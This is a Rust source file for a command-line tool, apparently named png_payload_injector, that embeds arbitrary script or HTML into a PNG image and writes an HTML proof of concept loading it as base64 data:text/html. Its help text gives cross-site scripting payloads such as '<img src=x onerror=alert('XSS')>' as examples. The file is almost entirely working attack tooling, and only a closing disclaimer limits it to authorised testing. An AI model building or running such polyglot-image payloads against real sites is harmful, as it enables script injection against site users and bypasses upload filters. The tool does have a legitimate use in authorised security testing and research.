mod png;

use std::fs::File;
use std::io::{self, Write};
use base64::prelude::*;
use png::build_png;
use clap::Parser;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
#[command(after_help = "EXAMPLES:
Embed a simple alert:
png_payload_injector -l \"<script>alert('Hello!')</script>\"

Create a custom-sized PNG with verbose output:
png_payload_injector -l \"<script>console.log('Test')</script>\" -w 100 -e 100 -v

Specify custom output files:
png_payload_injector -l \"<img src=x onerror=alert('XSS')>\" -o custom.png -p custom.html")]
struct Args {
    /// The payload to embed in the PNG
    ///
    /// This is typically a script or HTML code you want to inject.
    /// Example: "<script>alert('Hello!')</script>"
    #[arg(short = 'l', long, required = true)]
    payload: String,

    /// Width of the PNG image in pixels
    ///
    /// This determines the width of the generated PNG file.
    #[arg(short, long, default_value_t = 66)]
    width: u32,

    /// Height of the PNG image in pixels
    ///
    /// This determines the height of the generated PNG file.
    #[arg(short = 'e', long, default_value_t = 60)]
    height: u32,

    /// Output PNG filename
    ///
    /// This is where the generated PNG file will be saved.
    #[arg(short = 'o', long, default_value = "output.png")]
    output_png: String,

    /// Output HTML PoC filename
    ///
    /// This is where the generated HTML proof of concept will be saved.
    #[arg(short = 'p', long, default_value = "poc.html")]
    output_html: String,

    /// Use verbose output
    ///
    /// If set, the program will provide detailed information about each step of the process.
    #[arg(short, long)]
    verbose: bool,
}

fn create_png(payload: &[u8], width: u32, height: u32) -> io::Result<Vec<u8>> {
    build_png(payload, width, height)
}

fn encode_png_to_base64(png_data: &[u8]) -> String {
    BASE64_STANDARD.encode(png_data)
}

fn generate_html_poc(base64_png: &str) -> String {
    format!(
        r#"<html>
<head>
    <title>PNG PoC</title>
</head>
<body>
    <object data="data:text/html;base64,{}"></object>
</body>
</html>"#,
        base64_png
    )
}

fn write_to_file(filename: &str, content: &[u8]) -> io::Result<()> {
    let mut file = File::create(filename)?;
    file.write_all(content)
}

fn main() -> io::Result<()> {
    let args = Args::parse();
    
    if args.verbose {
        println!("Creating PNG with payload: {}", args.payload);
    }
    let png_data = create_png(args.payload.as_bytes(), args.width, args.height)?;
    
    if args.verbose {
        println!("Encoding PNG to Base64...");
    }
    let base64_png = encode_png_to_base64(&png_data);
    
    if args.verbose {
        println!("Generating HTML PoC...");
    }
    let html_poc = generate_html_poc(&base64_png);

    if args.verbose {
        println!("Writing PNG to file: {}", args.output_png);
    }
    write_to_file(&args.output_png, &png_data)?;

    if args.verbose {
        println!("Writing HTML PoC to file: {}", args.output_html);
    }
    write_to_file(&args.output_html, html_poc.as_bytes())?;

    println!("PNG file created: {}", args.output_png);
    println!("HTML PoC file created: {}", args.output_html);
    println!("\nCAUTION: This tool is for educational and testing purposes only.");
    println!("Do not use it for malicious purposes or against systems you don't own or have permission to test.");
    Ok(())
}